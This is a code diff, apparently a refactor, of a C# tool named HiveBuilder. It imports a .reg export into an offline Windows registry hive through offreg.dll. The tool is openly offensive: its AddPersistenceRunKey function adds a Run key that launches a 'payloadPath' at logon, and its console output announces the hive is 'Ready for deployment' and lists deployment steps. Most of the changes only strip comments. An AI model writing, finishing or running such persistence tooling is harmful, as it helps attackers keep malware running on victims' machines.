@@ -3,11 +3,9 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.RegularExpressions;
-using System.Collections.Generic;
 
 class HiveBuilder
 {
-    // Offreg.dll imports
     [DllImport("offreg.dll", CharSet = CharSet.Unicode)]
     static extern int OROpenHive(string hivePath, out IntPtr key);
 
@@ -26,7 +24,6 @@ class HiveBuilder
     [DllImport("offreg.dll")]
     static extern int ORCloseKey(IntPtr key);
 
-    // Advapi32 imports for bootstrap
     [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
     static extern int RegLoadAppKey(
         string lpFile, out IntPtr phkResult, uint samDesired, uint dwOptions, uint Reserved);
@@ -34,7 +31,6 @@ class HiveBuilder
     [DllImport("advapi32.dll")]
     static extern int RegCloseKey(IntPtr hKey);
 
-    // Registry value type constants (from WinNT.h)
     const uint REG_NONE        = 0;
     const uint REG_SZ          = 1;
     const uint REG_EXPAND_SZ   = 2;
@@ -46,13 +42,10 @@ class HiveBuilder
     const uint REG_RESOURCE_LIST = 8;
     const uint REG_FULL_RESOURCE_DESCRIPTOR = 9;
     const uint REG_RESOURCE_REQUIREMENTS_LIST = 10;
-    const uint REG_QWORD       = 11;   // 64-bit integer
+    const uint REG_QWORD       = 11;
 
     const uint REG_KEY_READ    = 0x20019;
 
-    // -------------------------------------------------------
-    // Create a registry key path level by level
-    // -------------------------------------------------------
     static IntPtr CreateKeyPath(IntPtr root, string keyPath)
     {
         string[] parts = keyPath.Split('\\');
@@ -69,45 +62,27 @@ class HiveBuilder
         return current;
     }
 
-    // -------------------------------------------------------
-    // Parse hex bytes from a string (removes line continuations and spaces)
-    // -------------------------------------------------------
     static byte[] ParseHexBytes(string hexStr)
     {
-        // Remove any remaining backslashes and newlines (should already be gone, but be safe)
         string clean = Regex.Replace(hexStr, @"\\\s*\r?\n\s*", "");
         clean = clean.Replace(" ", "").Replace("\t", "");
-
-        // Split on commas
         string[] parts = clean.Split(new char[] { ',' }, StringSplitOptions.RemoveEmptyEntries);
         byte[] result = new byte[parts.Length];
         for (int i = 0; i < parts.Length; i++)
-        {
             result[i] = Convert.ToByte(parts[i].Trim(), 16);
-        }
         return result;
     }
 
-    // -------------------------------------------------------
-    // Parse .reg file with flattened continuations and correct type handling
-    // -------------------------------------------------------
     static void ImportRegFile(IntPtr hiveRoot, string regFilePath)
     {
         Console.WriteLine($"[*] Importing reg export: {regFilePath}");
-
-        // Read entire file as UTF-16 LE (the format reg export uses)
         string fullFile = File.ReadAllText(regFilePath, Encoding.Unicode);
-
-        // Flatten all continuation lines: remove backslash + newline (and optional spaces)
         fullFile = Regex.Replace(fullFile, @"\\\s*\r?\n\s*", "");
-
-        // Split into lines again
         string[] lines = fullFile.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);
 
         IntPtr currentKey = IntPtr.Zero;
         string currentKeyPath = "";
-        int imported = 0;
-        int skipped = 0;
+        int imported = 0, skipped = 0;
 
         foreach (string rawLine in lines)
         {
@@ -116,48 +91,37 @@ class HiveBuilder
             if (line.StartsWith("Windows Registry Editor")) continue;
             if (line.StartsWith(";")) continue;
 
-            // Section header
             if (line.StartsWith("[") && line.EndsWith("]"))
             {
                 if (currentKey != IntPtr.Zero && currentKey != hiveRoot)
                     ORCloseKey(currentKey);
 
                 string fullPath = line.Trim('[', ']');
-
                 if (fullPath.StartsWith("HKEY_CURRENT_USER\\", StringComparison.OrdinalIgnoreCase))
                     currentKeyPath = fullPath.Substring("HKEY_CURRENT_USER\\".Length);
                 else if (fullPath.Equals("HKEY_CURRENT_USER", StringComparison.OrdinalIgnoreCase))
                     currentKeyPath = "";
-                else
-                {
-                    currentKey = IntPtr.Zero;
-                    currentKeyPath = "";
-                    continue;
-                }
+                else { currentKey = IntPtr.Zero; currentKeyPath = ""; continue; }
 
                 if (string.IsNullOrEmpty(currentKeyPath))
                     currentKey = hiveRoot;
                 else
                     currentKey = CreateKeyPath(hiveRoot, currentKeyPath);
-
                 continue;
             }
 
-            // Value line
             if (currentKey == IntPtr.Zero) continue;
             if (!line.Contains("=")) continue;
 
             int eqIdx = line.IndexOf('=');
             string valueName = line.Substring(0, eqIdx).Trim().Trim('"');
             string valueData = line.Substring(eqIdx + 1).Trim();
-
             if (valueName == "@") valueName = "";
 
             try
             {
                 if (valueData.StartsWith("\""))
                 {
-                    // REG_SZ
                     string s = valueData.Trim('"').Replace("\\\"", "\"").Replace("\\\\", "\\");
                     byte[] d = Encoding.Unicode.GetBytes(s + "\0");
                     ORSetValue(currentKey, valueName, REG_SZ, d, (uint)d.Length);
@@ -172,57 +136,31 @@ class HiveBuilder
                 }
                 else if (valueData.StartsWith("hex("))
                 {
-                    // General hex type: extract type code and hex data
                     int closeParen = valueData.IndexOf(')');
                     if (closeParen > 3)
                     {
-                        string typePart = valueData.Substring(4, closeParen - 4); // e.g., "b", "7", "2", "", etc.
-                        string hexPart = valueData.Substring(closeParen + 2);      // skip "):"
+                        string typePart = valueData.Substring(4, closeParen - 4);
+                        string hexPart = valueData.Substring(closeParen + 2);
                         byte[] d = ParseHexBytes(hexPart);
                         uint regType;
-
-                        // Map the type code to registry type constant
                         switch (typePart)
                         {
-                            case "":   // hex:
-                                regType = REG_BINARY;
-                                break;
-                            case "0":  // REG_NONE
-                                regType = REG_NONE;
-                                break;
-                            case "1":  // REG_SZ (uncommon)
-                                regType = REG_SZ;
-                                break;
-                            case "2":  // REG_EXPAND_SZ
-                                regType = REG_EXPAND_SZ;
-                                break;
-                            case "3":  // REG_BINARY
-                                regType = REG_BINARY;
-                                break;
-                            case "4":  // REG_DWORD (uncommon)
-                                regType = REG_DWORD;
-                                break;
-                            case "5":  // REG_DWORD_BIG_ENDIAN (rare)
-                                regType = REG_DWORD_BIG_ENDIAN;
-                                break;
-                            case "7":  // REG_MULTI_SZ
-                                regType = REG_MULTI_SZ;
-                                break;
-                            case "b":  // REG_QWORD (64-bit integer)
-                            case "B":
-                                regType = REG_QWORD;
-                                break;
-                            default:
-                                // Unknown type, fallback to binary
-                                regType = REG_BINARY;
-                                break;
+                            case "":   regType = REG_BINARY; break;
+                            case "0":  regType = REG_NONE; break;
+                            case "1":  regType = REG_SZ; break;
+                            case "2":  regType = REG_EXPAND_SZ; break;
+                            case "3":  regType = REG_BINARY; break;
+                            case "4":  regType = REG_DWORD; break;
+                            case "5":  regType = REG_DWORD_BIG_ENDIAN; break;
+                            case "7":  regType = REG_MULTI_SZ; break;
+                            case "b": case "B": regType = REG_QWORD; break;
+                            default:   regType = REG_BINARY; break;
                         }
                         ORSetValue(currentKey, valueName, regType, d, (uint)d.Length);
                         imported++;
                     }
                     else
                     {
-                        // Malformed hex line, treat as binary
                         byte[] d = ParseHexBytes(valueData.Substring(4));
                         ORSetValue(currentKey, valueName, REG_BINARY, d, (uint)d.Length);
                         imported++;
@@ -239,8 +177,6 @@ class HiveBuilder
             {
                 skipped++;
                 Console.WriteLine($"  [!] Error parsing {valueName}: {ex.Message}");
-                string snippet = valueData.Length > 60 ? valueData.Substring(0, 60) + "..." : valueData;
-                Console.WriteLine($"      Data: {snippet}");
             }
         }
 
@@ -250,9 +186,6 @@ class HiveBuilder
         Console.WriteLine($"[+] Import complete — {imported} values imported, {skipped} skipped");
     }
 
-    // -------------------------------------------------------
-    // Add persistence Run key
-    // -------------------------------------------------------
     static bool AddPersistenceRunKey(IntPtr hiveHandle, string payloadPath, string keyName)
     {
         Console.WriteLine($"[*] Adding persistence Run key: {keyName}");
@@ -268,9 +201,6 @@ class HiveBuilder
         return true;
     }
 
-    // -------------------------------------------------------
-    // Bootstrap hive using RegLoadAppKey
-    // -------------------------------------------------------
     static string CreateBootstrapHive()
     {
         Console.WriteLine("[*] Creating bootstrap hive via RegLoadAppKey...");
@@ -283,9 +213,6 @@ class HiveBuilder
         return bootstrapPath;
     }
 
-    // -------------------------------------------------------
-    // Main entry point
-    // -------------------------------------------------------
     static void Main(string[] args)
     {
         Console.WriteLine("╔═══════════════════════════════════════════════════════════════╗");
@@ -365,16 +292,9 @@ class HiveBuilder
         Console.WriteLine($"    Run key: {startupKeyName} = {payloadPath}");
 
         if (outputInfo.Length < 10240)
-        {
-            Console.WriteLine();
-            Console.WriteLine("[!] WARNING: Generated hive is very small (<10KB).");
-            Console.WriteLine("[!] The .reg import may have failed. Check skipped values above.");
-        }
+            Console.WriteLine("[!] WARNING: Generated hive is very small (<10KB). The .reg import may have failed.");
         else
-        {
-            Console.WriteLine();
             Console.WriteLine("[*] Hive size looks good. Ready for deployment.");
-        }
 
         Console.WriteLine();
         Console.WriteLine("[*] DEPLOYMENT STEPS:");
